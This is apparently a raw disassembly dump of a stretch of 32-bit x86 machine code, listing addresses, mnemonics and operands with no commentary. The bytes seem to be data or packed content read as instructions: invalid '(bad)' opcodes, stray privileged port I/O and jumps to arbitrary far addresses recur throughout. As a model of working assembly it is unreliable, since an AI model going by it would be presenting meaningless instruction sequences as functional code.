  4171bb:	bound  eax,QWORD PTR ds:0xf489c1e3
  4171c1:	xchg   ebx,eax
  4171c2:	sbb    BYTE PTR [eax],dl
  4171c4:	mov    esi,0x18c11d7d
  4171c9:	mov    al,ds:0xea1c7fb4
  4171ce:	ror    dh,cl
  4171d0:	out    0x67,eax
  4171d2:	pop    edi
  4171d3:	mov    edx,0x38cd8871
  4171d8:	jo     0x417210
  4171da:	push   ebx
  4171db:	mov    cl,0x2
  4171dd:	jg     0x417188
  4171df:	xor    al,cl
  4171e1:	imul   eax,edx,0xffffffb7
  4171e4:	mov    edx,0x3b10b1bc
  4171e9:	dec    ebx
  4171ea:	pop    ebp
  4171eb:	push   cs
  4171ec:	pop    ds
  4171ed:	(bad)  [ecx-0x5a]
  4171f0:	lahf   
  4171f1:	add    cl,BYTE PTR [esi+0x33570075]
  4171f7:	adc    dh,bl
  4171f9:	call   0x65ab:0x1dcda45d
  417200:	in     eax,dx
  417201:	scas   eax,DWORD PTR es:[edi]
  417202:	dec    esi
  417203:	dec    ecx
  417204:	(bad)  [ecx-0x477f6490]
  41720a:	pop    edi
  41720b:	jle    0x4171e7
  41720d:	push   ebp
  41720e:	into   
  41720f:	es stos DWORD PTR es:[edi],eax
  417211:	daa    
  417212:	inc    ebp
  417213:	aaa    
  417214:	xchg   edx,eax
  417215:	dec    edx
  417216:	xchg   ecx,eax
  417217:	and    dl,BYTE PTR [ebx+0x1774b158]
  41721d:	adc    DWORD PTR [esi+edi*8-0x5e],edi
  417221:	mov    dl,0x55
  417223:	bnd jl 0x41721d
  417226:	outs   dx,DWORD PTR ds:[esi]
  417227:	xor    eax,0x57b2d5c1
  41722c:	dec    ebp
  41722d:	mov    esi,0x63ce3b00
  417232:	mov    esp,0x30d0c887
  417237:	mov    dl,0xae
  417239:	mov    DWORD PTR [edx-0x4278a8e6],eax
  41723f:	aam    0x1
  417241:	(bad)  
  417242:	push   ebx
  417243:	std    
  417244:	mov    DWORD PTR [edi+0x601f20b6],esi
  41724a:	add    cl,BYTE PTR [ebp+0x6d]
  41724d:	cmp    ch,0x9c
  417250:	rcr    BYTE PTR [eax],0xfd
  417253:	inc    eax
  417254:	ss cs dec esp
  417257:	lahf   
  417258:	xchg   ebp,eax
  417259:	cmc    
  41725a:	or     DWORD PTR [ebp+0x445cbfd4],ebp
  417260:	leave  
  417261:	std    
  417262:	add    ch,BYTE PTR [edx-0x2d]
  417265:	test   ch,al
  417267:	das    
  417268:	add    eax,0xb3293308
  41726d:	fsubr  QWORD PTR [edi-0x566a2165]
  417273:	and    ebp,DWORD PTR ds:0x7a8af938
  417279:	sbb    ch,BYTE PTR [edx-0x65]
  41727c:	adc    al,0x1d
  41727e:	retf   0xefae
  417281:	sub    BYTE PTR [esi+0x7425d892],ch
  417287:	mov    ah,0x85
  417289:	sub    ch,BYTE PTR [edi+0x48acf413]
  41728f:	and    bh,BYTE PTR [ebp-0x7ff795af]
  417295:	mov    WORD PTR [ebx-0x3e6efaec],gs
  41729b:	adc    al,0x84
  41729d:	cli    
  41729e:	repnz mov WORD PTR [edi+0x8],ds
  4172a2:	les    ecx,FWORD PTR [eax-0x4c]
  4172a5:	sbb    eax,0x9c427830
  4172aa:	add    bl,bh
  4172ac:	aam    0x15
  4172ae:	pop    es
  4172af:	shl    edi,1
  4172b1:	daa    
  4172b2:	out    dx,eax
  4172b3:	add    al,0x9f
  4172b5:	mov    dl,BYTE PTR [ecx+ecx*8]
  4172b8:	xchg   BYTE PTR [esi-0x22],cl
  4172bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172bc:	jecxz  0x4172aa
  4172be:	xchg   BYTE PTR [esi-0x55],al
  4172c1:	(bad)  
  4172c2:	cmp    al,0xec
  4172c4:	and    bh,BYTE PTR [ebx-0x1eef3437]
  4172ca:	pcmpgtb mm5,mm4
  4172cd:	int3   
  4172ce:	jle    0x4172d1
  4172d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172d1:	sbb    eax,0x3041313e
  4172d6:	mov    edx,0x52f1e2f3
  4172db:	mov    ds:0x2b3cf69d,al
  4172e0:	enter  0x850c,0xca
  4172e4:	sub    ebx,DWORD PTR [ebx+0x43d78e3b]
  4172ea:	outs   dx,DWORD PTR ds:[esi]
  4172eb:	push   0x75
  4172ed:	jmp    0x7910:0x28e6b2c7
  4172f4:	lds    esi,FWORD PTR [ebx-0x11dc63f9]
  4172fa:	movntq QWORD PTR [eax-0x16c9f860],mm7
  417301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417302:	in     eax,0xd2
  417304:	mov    bl,0x3b
  417306:	push   edx
  417307:	mov    bl,0xeb
  417309:	or     ebp,DWORD PTR [ebp-0x13]
  41730c:	dec    esi
  41730d:	xor    eax,0x109b006c
  417312:	jle    0x41735b
  417314:	adc    al,0x29
  417316:	lds    esp,FWORD PTR [edx-0xe]
  417319:	sar    DWORD PTR [ecx+0x7c1616b0],1
  41731f:	xor    dh,al
  417321:	mov    al,BYTE PTR [ebp-0x13665959]
  417327:	comiss xmm1,DWORD PTR [edi]
  41732a:	test   eax,0x40543e4d
  41732f:	xchg   ebx,eax
  417330:	add    DWORD PTR [ebx+0x31],0x1bbf5a38
  417337:	and    DWORD PTR [ebx-0x26],0xffffffa8
  41733b:	je     0x417359
  41733d:	enter  0x8b4b,0x6e
  417341:	add    dh,BYTE PTR [eax+0x6e]
  417344:	or     ah,BYTE PTR [ebp-0x3489a7ce]
  41734a:	cli    
  41734b:	out    dx,eax
  41734c:	dec    esp
  41734d:	dec    esi
  41734e:	enter  0x322,0x1c
  417352:	or     DWORD PTR [edx],ecx
  417354:	popa   
  417355:	shl    BYTE PTR [esi+edx*4-0x1590e0e9],0x3e
  41735d:	(bad)  
  41735e:	cli    
  41735f:	aas    
  417360:	sbb    esp,esp
  417362:	push   ecx
  417363:	push   DWORD PTR [ecx+0x355c662a]
  417369:	mov    ebp,0x9ae448bb
  41736e:	pop    ebp
  41736f:	pop    ebx
  417370:	adc    DWORD PTR [ecx+ecx*1],eax
  417373:	(bad)  
  417374:	test   al,0x11
  417376:	inc    ecx
  417377:	jne    0x4173dd
  417379:	mov    edi,fs
  41737b:	jo     0x417354
  41737d:	sti    
  41737e:	xor    dh,BYTE PTR [ebx-0x53c80ef3]
  417384:	ret    0xb1bf
  417387:	sub    eax,0x7e23c14f
  41738c:	call   FWORD PTR [eax]
  41738e:	inc    esi
  41738f:	adc    al,0xaa
  417391:	jle    0x417329
  417393:	push   ds
  417394:	add    BYTE PTR ds:0x32716642,ah
  41739a:	push   0x59
  41739c:	shl    BYTE PTR [esi-0x48],0xfc
  4173a0:	loope  0x41737a
  4173a2:	pop    edx
  4173a3:	das    
  4173a4:	and    eax,0x50aeb353
  4173a9:	out    0x41,al
  4173ab:	nop
  4173ac:	mov    cl,0x30
  4173ae:	jle    0x41733f
  4173b0:	(bad)  
  4173b1:	xor    al,0xa7
  4173b3:	jno    0x417423
  4173b5:	pop    ss
  4173b6:	inc    ecx
  4173b7:	mov    esp,0x6fb761f1
  4173bc:	dec    ebx
  4173bd:	fld    DWORD PTR [eax-0x65]
  4173c0:	sub    cl,BYTE PTR [edx]
  4173c2:	je     0x417344
  4173c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173c5:	aaa    
  4173c6:	or     eax,esi
  4173c8:	jmp    0xcb06:0xfb742dfb
  4173cf:	loopne 0x417404
  4173d1:	adc    eax,0xa0e1a649
  4173d6:	add    ecx,esi
  4173d8:	and    bh,BYTE PTR [eax+0x70]
  4173db:	std    
  4173dc:	mov    esp,0x65db7ba0
  4173e1:	aaa    
  4173e2:	pop    esi
  4173e3:	ror    BYTE PTR [edx-0x57],cl
  4173e6:	pop    edi
  4173e7:	retf   0x4e4c
  4173ea:	faddp  st(2),st
  4173ec:	mov    eax,0x21b340fe
  4173f1:	pop    esp
  4173f2:	int3   
  4173f3:	aam    0xe0
  4173f5:	out    0x8,eax
  4173f7:	mov    bh,0x56
  4173f9:	mov    edi,0xbea4b
  4173fe:	adc    al,0x9e
  417400:	or     BYTE PTR [esi+0x23053207],0xde
  417407:	cld    
  417408:	ja     0x41739b
  41740a:	cmp    eax,0x75881875
  41740f:	mov    edx,0x2b4236d3
  417414:	push   esp
  417415:	sbb    DWORD PTR [edx-0x2d4e8b4b],edi
  41741b:	and    ecx,DWORD PTR [ebp+0x4ec67f7d]
  417421:	jmp    0x578b:0x47f9251d
  417428:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417429:	fldenv [ebp+0x4721af68]
  41742f:	mov    edx,0x91434b9d
  417434:	js     0x41740e
  417436:	and    BYTE PTR [edi-0x78dce4cd],0x1e
  41743d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41743e:	fsubr  DWORD PTR [ebx-0x1e]
  417441:	mov    al,0x27
  417443:	xor    eax,0x433c768a
  417448:	lods   al,BYTE PTR ds:[esi]
  417449:	imul   DWORD PTR [ecx-0x75]
  41744c:	or     DWORD PTR [eax],0x6
  41744f:	enter  0xc1e3,0xe1
  417453:	mov    DWORD PTR [bp+si-0x19],ebx
  417457:	ret    0x4f60
  41745a:	jb     0x4173f8
  41745c:	leave  
  41745d:	mov    DWORD PTR [esi-0x5b],0x806e76ff
  417464:	sbb    BYTE PTR [edi-0x4c2daf20],bh
  41746a:	out    0x0,eax
  41746c:	mov    bl,0xf
  41746e:	pusha  
  41746f:	mov    esp,0x43c11cec
  417474:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417475:	cld    
  417476:	sbb    DWORD PTR [edi-0x32],0x3c
  41747a:	xor    esi,esi
  41747c:	sub    BYTE PTR [ebx-0x58],bh
  41747f:	fs ss mov eax,0xcebb374b
  417486:	shr    BYTE PTR [edi],0x92
  417489:	adc    DWORD PTR [ecx+0xdd5079],0xfffffff5
  417490:	cwde   
  417491:	imul   edi
  417493:	inc    eax
  417494:	inc    ebp
  417495:	jae    0x41742d
  417497:	dec    edi
  417498:	pop    ecx
  417499:	shl    BYTE PTR ds:0xbbf55a8d,0xf8
  4174a0:	sbb    ebx,edi
  4174a2:	dec    esp
  4174a3:	(bad)  
  4174a4:	jae    0x41745e
  4174a6:	jecxz  0x4174be
  4174a8:	jno    0x41744a
  4174aa:	and    ch,BYTE PTR [esi+0x3c625925]
  4174b0:	pop    edi
  4174b1:	inc    edi
  4174b2:	mov    ch,0x61
  4174b4:	jne    0x41747f
  4174b6:	mov    al,ds:0xd9b129e8
  4174bb:	(bad)  
  4174bc:	or     BYTE PTR [ecx],al
  4174be:	int    0x13
  4174c0:	mov    WORD PTR [ebp+0x71],?
  4174c3:	mov    ds:0xdd619a64,eax
  4174c8:	int3   
  4174c9:	sbb    DWORD PTR [ecx+esi*8],0x25a4e396
  4174d0:	mov    ecx,0x8d2747c4
  4174d5:	(bad)  
  4174d6:	out    dx,al
  4174d7:	retf   0x7206
  4174da:	xlat   BYTE PTR ds:[ebx]
  4174db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174dc:	sub    ebp,DWORD PTR [edx]
  4174de:	push   ecx
  4174df:	sbb    ah,0x63
  4174e2:	and    al,0x86
  4174e4:	cmp    eax,0xa3af7586
  4174e9:	mov    eax,DWORD PTR [edx]
  4174eb:	mov    ch,0xa8
  4174ed:	lods   eax,DWORD PTR ds:[esi]
  4174ee:	sti    
  4174ef:	idiv   DWORD PTR [edi-0x53]
  4174f2:	push   0x614068e5
  4174f7:	push   ss
  4174f8:	shl    DWORD PTR ds:[edx],cl
  4174fb:	or     al,ah
  4174fd:	stos   BYTE PTR es:[edi],al
  4174fe:	cmp    BYTE PTR [eax-0x58],bl
  417501:	popa   
  417502:	xor    BYTE PTR [ebx-0x64],dl
  417505:	sbb    BYTE PTR [ebp+0x133f488b],dh
  41750b:	out    dx,al
  41750c:	out    0x95,al
  41750e:	out    0x64,al
  417510:	pop    es
  417511:	in     al,dx
  417512:	neg    bl
  417514:	scas   al,BYTE PTR es:[edi]
  417515:	dec    esi
  417516:	pop    ds
  417517:	sub    BYTE PTR [ecx+0x28f2e20c],al
  41751d:	in     eax,0xda
  41751f:	jbe    0x417589
  417521:	shl    ecx,cl
  417523:	gs mov edx,0xef82667d
  417529:	das    
  41752a:	mov    edi,0xbf683753
  41752f:	mov    BYTE PTR [ebp-0x6e],ch
  417532:	std    
  417533:	or     ah,BYTE PTR [ebx+0xc639021]
  417539:	ja     0x41750c
  41753b:	push   esp
  41753c:	adc    edi,DWORD PTR [edx-0x73e771e0]
  417542:	dec    ecx
  417543:	data16 rcl BYTE PTR [edi+esi*4],0xbd
  417548:	dec    eax
  417549:	inc    edi
  41754a:	je     0x4174f1
  41754c:	shl    DWORD PTR [edi-0x7e],1
  41754f:	repnz mov ?,WORD PTR [edi+ecx*4+0x112eb6ea]
  417557:	dec    eax
  417558:	outs   dx,DWORD PTR ds:[esi]
  417559:	ins    DWORD PTR es:[di],dx
  41755b:	sti    
  41755c:	mov    edx,0xc9121e61
  417561:	test   eax,0x66b5948a
  417566:	(bad)  
  417567:	out    0x54,al
  417569:	mov    ds:0x1f9ab905,al
  41756e:	(bad)  
  41756f:	out    dx,eax
  417570:	sahf   
  417571:	je     0x4175dc
  417573:	push   ebx
  417574:	and    al,0x57
  417576:	xchg   ecx,eax
  417577:	mov    ecx,0x2113f1da
  41757c:	xor    DWORD PTR ds:0x9e0bd8bc,0x74560e66
  417586:	dec    ebx
  417587:	enter  0xbaa9,0xb2
  41758b:	push   cs
  41758c:	sub    DWORD PTR [eax],ebp
  41758e:	jbe    0x4175ba
  417590:	mov    dh,0xbb
  417592:	sub    al,bl
  417594:	jno    0x41759f
  417596:	dec    edx
  417597:	imul   edi,DWORD PTR [ebx-0x4e2a8a76],0xffffffd7
  41759e:	or     eax,0x960ca139
  4175a3:	jmp    0x417577
  4175a5:	adc    al,0x81
  4175a7:	push   eax
  4175a8:	inc    ecx
  4175a9:	call   0x70bc:0x184aa228
  4175b0:	icebp  
  4175b1:	pop    edx
  4175b2:	(bad)  
  4175b3:	and    edx,esp
  4175b5:	add    BYTE PTR [eax+0x35e86782],bl
  4175bb:	sbb    bh,BYTE PTR [edi]
  4175bd:	mov    eax,ds:0xe816543f
  4175c2:	mov    WORD PTR [eax-0x33],?
  4175c5:	(bad)  
  4175c6:	(bad)  
  4175c7:	in     eax,dx
  4175c8:	imul   esi,eax,0xd0283842
  4175ce:	sahf   
  4175cf:	pop    ss
  4175d0:	out    dx,eax
  4175d1:	fadd   DWORD PTR ds:0xdc237f21
  4175d7:	neg    DWORD PTR [ebp+eax*8+0xf]
  4175db:	add    ebp,DWORD PTR [edx-0x63360bb7]
  4175e1:	push   0xd1d0ffdb
  4175e6:	jecxz  0x41765d
  4175e8:	adc    DWORD PTR [eax+0x35965263],eax
  4175ee:	sub    BYTE PTR [ecx],0x61
  4175f1:	jnp    0x417634
  4175f3:	pushf  
  4175f4:	or     al,0x15
  4175f6:	mov    edx,0xe56d409a
  4175fb:	test   cl,bh
  4175fd:	mov    esi,0xf6b85272
  417602:	xchg   ebp,eax
  417603:	test   al,0x94
  417605:	or     DWORD PTR [ebp-0x16854292],0xe9eb2273
  41760f:	div    BYTE PTR [esi+0x58]
  417612:	push   esp
  417613:	enter  0xc6fd,0x93
  417617:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417618:	adc    cl,ah
  41761a:	addr16 mov ?,ecx
  41761d:	sbb    bh,BYTE PTR [ebx+ecx*2+0x7a9aed87]
  417624:	mov    bl,0x13
  417626:	and    eax,0x9f5c2638
  41762b:	pushf  
  41762c:	jo     0x4175cb
  41762e:	lock add DWORD PTR [ecx-0x602a01e5],0x6a099f32
  417639:	dec    edi
  41763a:	mov    esp,0x87e3a222
  41763f:	sub    eax,0x72630f1
  417644:	sub    al,0x81
  417646:	jmp    0x4176c3
  417648:	inc    ecx
  417649:	sbb    BYTE PTR [edx+ebx*1+0x3f],dl
  41764d:	pop    esi
  41764e:	lods   eax,DWORD PTR ds:[esi]
  41764f:	into   
  417650:	xchg   ah,ah
  417652:	mov    al,ds:0x63fc8794
  417657:	and    ch,ah
  417659:	lea    eax,[edx-0x1ea96b5f]
  41765f:	sbb    esp,esp
  417661:	fs pop ebx
  417663:	fs push esi
  417665:	mov    esp,DWORD PTR [esi]
  417667:	imul   edx,ebx,0x85afdc35
  41766d:	inc    eax
  41766e:	inc    ecx
  41766f:	jle    0x4176aa
  417671:	enter  0xca88,0xbb
  417675:	mov    bh,0x96
  417677:	lds    esi,FWORD PTR [ecx-0x4632a556]
  41767d:	fs nop
  41767f:	adc    bh,cl
  417681:	ret    0x5c91
  417684:	loopne 0x417612
  417686:	aas    
  417687:	sar    DWORD PTR [eax-0x6ce951bd],1
  41768d:	inc    edx
  41768e:	jns    0x4176a1
  417690:	adc    BYTE PTR [esi+0x16],bl
  417693:	ins    BYTE PTR es:[edi],dx
  417694:	out    0x9a,eax
  417696:	mov    BYTE PTR [ecx-0x75a3d869],dh
  41769c:	mov    dl,0x72
  41769e:	aad    0xa8
  4176a0:	(bad)  
  4176a1:	mov    ch,0xec
  4176a3:	jae    0x4176b5
  4176a5:	sub    bh,bh
  4176a7:	mov    ch,0x7f
  4176a9:	add    dl,BYTE PTR [edx]
  4176ab:	lods   al,BYTE PTR ds:[esi]
  4176ac:	jmp    0x41767b
  4176ae:	jp     0x417677
  4176b0:	stos   BYTE PTR es:[edi],al
  4176b1:	call   0x96b0f4da
  4176b6:	jp     0x4176f8
  4176b8:	mov    eax,0xd70e1474
  4176bd:	retf   0x9e2d
  4176c0:	mov    edx,0x55036324
  4176c5:	repz call 0x4ffb1fbc
  4176cb:	xchg   ecx,eax
  4176cc:	and    eax,0xe6f57d23
  4176d1:	sub    ecx,ebx
  4176d3:	in     eax,dx
  4176d4:	out    dx,al
  4176d5:	cmp    BYTE PTR [edi],bl
  4176d7:	ds dec eax
  4176d9:	icebp  
  4176da:	daa    
  4176db:	in     eax,dx
  4176dc:	jnp    0x4176b2
  4176de:	and    ebx,DWORD PTR [edi-0x21e67441]
  4176e4:	pop    ebx
  4176e5:	leave  
  4176e6:	xor    eax,0xc639e488
  4176eb:	retf   0x9853
  4176ee:	pop    ds
  4176ef:	pop    es
  4176f0:	call   0xbe97:0x2f4b2e51
  4176f7:	push   edx
  4176f8:	xchg   DWORD PTR [edi+0x7f08ced4],eax
  4176fe:	add    ebp,DWORD PTR [eax-0x57971235]
  417704:	dec    esi
  417705:	xchg   esp,eax
  417706:	jae    0x4176a9
  417708:	(bad)  
  417709:	mov    ch,ch
  41770b:	iret   
  41770c:	jne    0x4176b3
  41770e:	arpl   WORD PTR cs:[ecx+0x1d657f79],si
  417715:	and    DWORD PTR [ecx+0x6ffbec0],ebx
  41771b:	sub    esp,DWORD PTR [ebx-0x27cebb64]
  417721:	in     eax,0xef
  417723:	cmc    
  417724:	and    BYTE PTR [esi+0x8],0x90
  417728:	mov    eax,ds:0xfefed742
  41772d:	mov    DWORD PTR [edi-0x3e4fb0a],edx
  417733:	and    ebx,esi
  417735:	jge    0x417761
  417737:	xchg   edx,eax
  417738:	xor    DWORD PTR [edx+esi*4-0x6ac1ee37],ebx
  41773f:	ret    
  417740:	cli    
  417741:	xchg   edi,ebp
  417743:	and    eax,0x2eeb646d
  417748:	mov    ah,0x16
  41774a:	and    al,0x9
  41774c:	pop    edx
  41774d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41774e:	jnp    0x4177ad
  417750:	into   
  417751:	sbb    eax,0xcf5b1d02
  417756:	sub    DWORD PTR [eax-0x15f1d686],ebp
  41775c:	fstp   TBYTE PTR [edi]
  41775e:	xchg   edi,eax
  41775f:	inc    ebp
  417760:	iret   
  417761:	xchg   ebp,eax
  417762:	hlt    
  417763:	or     ebx,edi
  417765:	popa   
  417766:	ret    
  417767:	jg     0x41771c
  417769:	lock cmp al,0x36
  41776c:	adc    DWORD PTR [eax+0x1abf8076],ebx
  417772:	adc    BYTE PTR [esi+edi*1-0x7a3b15cd],dh
  417779:	arpl   WORD PTR [ebx+0x4a],cx
  41777c:	add    BYTE PTR [esi-0x85a7ef],ch
  417782:	pushf  
  417783:	std    
  417784:	sub    eax,0x54b24447
  417789:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41778a:	ficom  WORD PTR [bp+di+0x6ecb]
  41778f:	(bad)  
  417790:	sti    
  417791:	je     0x417737
  417793:	adc    al,0x41
  417795:	call   0x4f18:0x379f3b65
  41779c:	out    0xd1,al
  41779e:	pop    edi
  41779f:	add    edx,0x3a
  4177a2:	adc    eax,0xa900e81d
  4177a7:	jl     0x417770
  4177a9:	sbb    eax,0xd6e9661d
  4177ae:	imul   eax,DWORD PTR [ebx],0xa292b8ef
  4177b4:	mov    eax,DWORD PTR [esi*4-0x11132fd6]
  4177bb:	je     0x417761
  4177bd:	das    
  4177be:	and    bh,cl
  4177c0:	sub    BYTE PTR [edx],ch
  4177c2:	ror    DWORD PTR [ecx+0x7c],1
  4177c5:	mov    ebx,0x618ad5a0
  4177ca:	lods   eax,DWORD PTR ds:[esi]
  4177cb:	dec    edi
  4177cc:	call   0xa01d:0xadd57222
  4177d3:	jle    0x417768
  4177d5:	mov    edx,0x9e0ae248
  4177da:	mov    edx,0x49f6abe6
  4177df:	mov    al,ds:0xb755d54d
  4177e4:	(bad)
  4177e7:	cmp    ah,BYTE PTR [ebx]
  4177e9:	jb     0x417822
  4177eb:	or     al,0x59
  4177ed:	test   al,dl
  4177ef:	imul   edx,DWORD PTR [edx+0x2a68cbbb],0xcb179d18
  4177f9:	sbb    al,0x49
  4177fb:	adc    esi,eax
  4177fd:	fisttp DWORD PTR [ecx]
  4177ff:	pop    ebp
  417800:	cmp    BYTE PTR [eax-0x55d3fb81],ch
  417806:	jmp    0x417839
  417808:	or     eax,0x1a4aad8b
  41780d:	cdq    
  41780e:	aam    0xdf
  417810:	sbb    eax,0x322ba03a
  417815:	pop    edx
  417816:	gs mov ch,0x48
  417819:	mov    ebx,0x87768e69
  41781e:	cwde   
  41781f:	call   0x3ab7ea81
  417824:	inc    esi
  417825:	cdq    
  417826:	mov    bh,0xaa
  417828:	pop    ebx
  417829:	loop   0x41784c
  41782b:	(bad)  
  41782c:	sub    ah,BYTE PTR [eax*2+0x5be95d24]
  417833:	pop    ds
  417834:	or     BYTE PTR [eax],ah
  417836:	cmp    BYTE PTR [edx],bh
  417838:	retf   0xd0c8
  41783b:	xchg   esp,eax
  41783c:	(bad)  
  41783d:	idiv   BYTE PTR [ebp-0x48645950]
  417843:	jmp    0x417866
  417845:	xor    edi,DWORD PTR [edi]
  417847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417848:	xchg   DWORD PTR [esi+esi*2+0x29],esp
  41784c:	sub    BYTE PTR [esi-0x63],cl
  41784f:	ret    
  417850:	pop    eax
  417851:	icebp  
  417852:	iret   
  417853:	or     al,0x22
  417855:	add    al,0xf3
  417857:	xchg   ebp,eax
  417858:	dec    esp
  417859:	gs or  bh,dh
  41785c:	mov    ecx,0x3e60a64c
  417861:	adc    dl,BYTE PTR [esi-0x14]
  417864:	inc    eax
  417865:	xor    BYTE PTR [ebx+0x55],ch
  417868:	adc    DWORD PTR ds:0xb87af98f,ecx
  41786e:	in     al,dx
  41786f:	(bad)  
  417870:	pop    ds
  417871:	jmp    0x1cbc:0x6d16dab
  417878:	out    0xc,eax
  41787a:	inc    esp
  41787b:	add    edx,edx
  41787d:	sub    eax,0x4b47356d
  417882:	dec    esi
  417883:	arpl   dx,dx
  417885:	sbb    al,0xa7
  417887:	out    dx,eax
  417888:	xchg   ebp,eax
  417889:	or     ebx,DWORD PTR [esi-0x5a1a21ba]
  41788f:	rcr    DWORD PTR [ecx],1
  417891:	clc    
  417892:	mov    cl,0x77
  417894:	fist   WORD PTR [edx-0x1c10b7c2]
  41789a:	pop    edi
  41789b:	ins    DWORD PTR es:[edi],dx
  41789c:	(bad)  
  41789d:	fsubr  QWORD PTR [esp+ebp*8-0x244e64c9]
  4178a4:	jnp    0x417855
  4178a6:	sbb    BYTE PTR [eax-0x32],bl
  4178a9:	or     al,dl
  4178ab:	and    DWORD PTR [edi-0x7b690443],edx
  4178b1:	dec    eax
  4178b2:	in     al,0x6b
  4178b4:	ins    DWORD PTR es:[edi],dx
  4178b5:	dec    esp
  4178b6:	push   ds
  4178b7:	jecxz  0x41785e
  4178b9:	outs   dx,DWORD PTR ds:[esi]
  4178ba:	nop
  4178bb:	scas   al,BYTE PTR es:[edi]
  4178bc:	inc    ecx
  4178bd:	into   
  4178be:	loop   0x417869
  4178c0:	into   
  4178c1:	pop    esp
  4178c2:	(bad)  
  4178c3:	leave  
  4178c4:	jns    0x417883
  4178c6:	mov    ds:0x20978597,al
  4178cb:	dec    ecx
  4178cc:	mov    dh,0x7c
  4178ce:	arpl   WORD PTR [edi+eiz*4+0x52b8222a],sp
  4178d5:	sub    esi,DWORD PTR [ebx+edx*2-0x65a76573]
  4178dc:	ss nop
  4178de:	jno    0x4178ce
  4178e0:	inc    eax
  4178e1:	sti    
  4178e2:	fimul  DWORD PTR [eax]
  4178e4:	xchg   edx,eax
  4178e5:	icebp  
  4178e6:	shl    DWORD PTR [edx+0x64],0x9
  4178ea:	test   eax,0xec4708bf
  4178ef:	push   ds
  4178f0:	shr    ah,1
  4178f2:	sub    al,0x7e
  4178f4:	lds    ebx,FWORD PTR ds:0x4ff1c5ae
  4178fa:	sub    DWORD PTR [eax-0x3c68b931],esi
  417900:	xor    eax,0xf3a236c2
  417905:	fst    DWORD PTR [ebx+0x1f]
  417908:	in     al,0x39
  41790a:	mov    edi,0x14733b82
  41790f:	pop    es
  417910:	mov    ah,0x2a
  417912:	push   ebx
  417913:	sbb    al,0xde
  417915:	cmc    
  417916:	cmp    eax,0x64d933b4
  41791b:	add    eax,0xda323a30
  417920:	sub    eax,0x3ba8d007
  417925:	sbb    ebx,DWORD PTR [edx]
  417927:	inc    edx
  417928:	cmp    DWORD PTR [eax-0x21],esi
  41792b:	sbb    DWORD PTR gs:[bx+si],ebx
  41792f:	sub    eax,0xc5c6ac8a
  417934:	aas    
  417935:	int3   
  417936:	sbb    DWORD PTR [ecx],esp
  417938:	push   ebx
  417939:	addr16 jnp 0x417916
  41793c:	int3   
  41793d:	bound  esp,QWORD PTR [edi+edi*4-0x45b881fe]
  417944:	in     al,0x20
  417946:	cmp    BYTE PTR [eax+ebx*1-0x7e],ch
  41794a:	int    0x30
  41794c:	mov    ds:0x4e1d08b6,eax
  417951:	jb     0x417942
  417953:	sub    ebx,DWORD PTR [eax]
  417955:	jnp    0x41793d
  417957:	lahf   
  417958:	in     al,0xbe
  41795a:	popf   
  41795b:	cli    
  41795c:	or     al,0xf3
  41795e:	fdivr  QWORD PTR [edx+eax*4-0x2a]
  417962:	retf   0xbb94
  417965:	call   0xa78e467
  41796a:	loop   0x4179a9
  41796c:	jo     0x4179eb
  41796e:	push   ecx
  41796f:	popa   
  417970:	loop   0x4179f1
  417972:	int3   
  417973:	mov    edx,0xa3953ab6
  417978:	inc    edx
  417979:	mov    ds:0xe0307da9,eax
  41797e:	push   ss
  41797f:	pop    edx
  417980:	fild   WORD PTR ds:0xf79faec6
  417986:	inc    edx
  417987:	push   eax
  417988:	out    dx,eax
  417989:	inc    ecx
  41798a:	in     al,dx
  41798b:	jg     0x4179cb
  41798d:	push   ebp
  41798f:	popf   
  417990:	mov    ebp,0x80674a49
  417995:	out    dx,eax
  417996:	add    BYTE PTR [esi+0x3f],0xab
  41799a:	das    
  41799b:	mov    ds:0x598cd25b,eax
  4179a0:	sub    eax,0xbb66eb90
  4179a5:	fs mov ebp,0x5f9e418f
  4179ab:	sub    eax,0x1cf706ee
  4179b0:	pop    edi
  4179b1:	es (bad) 
  4179b3:	push   0x90582c8e
  4179b8:	pop    eax
  4179b9:	push   es
  4179ba:	mov    bh,0x57
  4179bc:	or     BYTE PTR [edx],dh
  4179be:	rcr    ecx,cl
  4179c0:	xor    esp,DWORD PTR [edi+edx*4-0x3b5a0135]
  4179c7:	aas    
  4179c8:	bound  esp,QWORD PTR ds:0xdbc871b1
  4179ce:	inc    edi
  4179cf:	mov    bh,0xbc
  4179d1:	xor    DWORD PTR [esi+0x42],0x50
  4179d5:	(bad)  
  4179d6:	call   0xc3be:0x3e11d4a6
  4179dd:	mov    ebx,0xe313e44f
  4179e2:	int3   
  4179e3:	jmp    0xc40fafd
  4179e8:	popf   
  4179e9:	xor    eax,0x6425d15
  4179ee:	cmp    edi,DWORD PTR [edi-0x15]
  4179f1:	rol    BYTE PTR [esp+eax*1-0x23b3e660],0xb
  4179f9:	sub    esi,DWORD PTR [ecx-0x59275f4d]
  4179ff:	mov    ds:0xdb1ed092,al
  417a04:	bound  ebx,QWORD PTR [esi-0x392f2517]
  417a0a:	ins    DWORD PTR es:[edi],dx
  417a0b:	mov    esp,0x880e3539
  417a10:	dec    ebx
  417a11:	(bad)  
  417a12:	imul   ebp,DWORD PTR gs:[ebp+0x2f],0xffffffc0
  417a17:	pushf  
  417a18:	in     al,dx
  417a19:	sbb    eax,eax
  417a1b:	retf   0x429
  417a1e:	pop    ss
  417a1f:	fcomp  QWORD PTR [edi+0x79]
  417a22:	loop   0x417a3a
  417a24:	rol    DWORD PTR [edi+edx*8],cl
  417a27:	outs   dx,BYTE PTR ds:[esi]
  417a28:	jo     0x4179d8
  417a2a:	(bad)  
  417a2b:	dec    eax
  417a2c:	sub    al,0xe4
  417a2e:	popf   
  417a2f:	(bad)  
  417a31:	loope  0x4179ce
  417a33:	repz inc ecx
  417a35:	cmp    edx,DWORD PTR [ecx]
  417a37:	aas    
  417a38:	sti    
